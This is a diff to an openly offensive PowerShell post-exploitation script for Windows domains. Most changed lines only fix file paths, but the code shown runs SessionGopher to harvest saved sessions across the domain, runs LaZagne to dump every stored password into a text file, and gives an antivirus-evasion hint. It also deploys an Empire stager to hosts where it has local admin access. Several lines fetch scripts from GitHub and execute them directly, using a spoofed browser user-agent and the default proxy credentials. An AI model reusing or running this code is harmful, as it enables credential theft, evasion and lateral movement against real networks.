@@ -30,7 +30,6 @@ function dependencychecks
                               5         =    " Primary Domain Controller "       
          }
 
-
         #Proxy Detect #1
         proxydetect
         
@@ -158,12 +157,12 @@ function sessionGopher {
             $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
-                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in .\LocalRecon\SessionGopher.txt:'
+                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                 Invoke-SessionGopher -Thorough -AllDomain >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
             }
             else 
             {
-                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in .\LocalRecon\SessionGopher.txt:'
+                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                 Invoke-SessionGopher -AllDomain >> $currentPath\LocalRecon\SessionGopher.txt
             }
     }
@@ -172,12 +171,12 @@ function sessionGopher {
         $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
-                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in .\LocalRecon\SessionGopher.txt:'
+                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                 Invoke-SessionGopher -Thorough >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
             }
             else 
             {
-                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in .\LocalRecon\SessionGopher.txt:'
+                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                 Invoke-SessionGopher >> $currentPath\LocalRecon\SessionGopher.txt
             }
     }
@@ -236,12 +235,10 @@ function localreconmodules
                  $PSrecon = Read-Host -Prompt 'Do you want to gather local computer Informations with PSRecon? (yes/no)'
                 if ($PSrecon -eq "yes" -or $PSrecon -eq "y" -or $PSrecon -eq "Yes" -or $PSrecon -eq "Y")
                 {
-                    Write-Host -ForegroundColor Yellow 'Starting PsRecon:'
-                    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1' -Outfile $currentPath\LocalRecon\Psrecon.ps1
-                    .\Psrecon.ps1
+                    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Headers.Add(“user-agent”, “Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0”);$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1'' -Outfile .\LocalRecon\Psrecon.ps1;Write-Host -ForegroundColor Yellow ''Starting PsRecon:'';.\LocalRecon\Psrecon.ps1;pause}'
                 }
-                Write-Host -ForegroundColor Yellow 'Saving general computer information to .\LocalRecon\Computerdetails.txt:'
-                Get-ComputerDetails >> $currentPath\LocalRecon\Computerdetails.txt
+                Write-Host -ForegroundColor Yellow "Saving general computer information to $currentPath\LocalRecon\Computerdetails.txt:"
+                Get-ComputerDetails >> "$currentPath\LocalRecon\Computerdetails.txt"
 
                 Write-Host -ForegroundColor Yellow 'Starting WINSpect:'
             invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Headers.Add(“user-agent”, “Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0”);$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/A-mIn3/WINspect/master/WINspect.ps1'');}'
@@ -361,7 +358,7 @@ function lazagnemodule
     if (Test-Path $currentPath\Lazagne\Windows\laZagne.exe)
     {
         Write-Host -ForegroundColor Yellow 'Not killed, Executing:'
-        .\Lazagne\Windows\laZagne.exe all >> $currentPath\Lazagne\Passwords.txt
+        "$currentPath\Lazagne\Windows\laZagne.exe all" >> $currentPath\Lazagne\Passwords.txt
         Write-Host -ForegroundColor Yellow 'Results saved to $currentPath\Lazagne\Passwords.txt!'
     }
     else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or RAM-Execution with Pupy:'}
@@ -433,11 +430,11 @@ function empirelauncher
     #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1') maybe an alternative later on.
     if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
     {
-        $exploitHosts = Get-Content .\Exploitation\LocalAdminAccess.txt
+        $exploitHosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"
     }
     else
     {
-        $file = ".\Exploitation\Exploited_Empire.txt"
+        $file = "$currentPath\Exploitation\Exploited_Empire.txt"
         While($i -ne "quit") 
         {
 	        If ($i -ne $NULL) 
@@ -449,7 +446,7 @@ function empirelauncher
 
     }
 
-    $stagerfile = ".\Exploitation\Empire_Stager.txt"
+    $stagerfile = "$currentPath\Exploitation\Empire_Stager.txt"
     While($Payload -ne "quit") 
     {
 	    If ($Payload -ne $NULL) 
@@ -463,9 +460,9 @@ function empirelauncher
 
     if (Test-Path $currentPath\Exploitation\Exploited_Empire.txt)
     {
-        $Hosts = Get-Content .\Exploitation\Exploited_Empire.txt
+        $Hosts = Get-Content "$currentPath\Exploitation\Exploited_Empire.txt"
     }
-    else {$Hosts = Get-Content .\Exploitation\LocalAdminAccess.txt}
+    else {$Hosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"}
 
     if ($executionwith -eq "yes" -or $executionwith -eq "y" -or $executionwith -eq "Yes" -or $executionwith -eq "Y")
     {
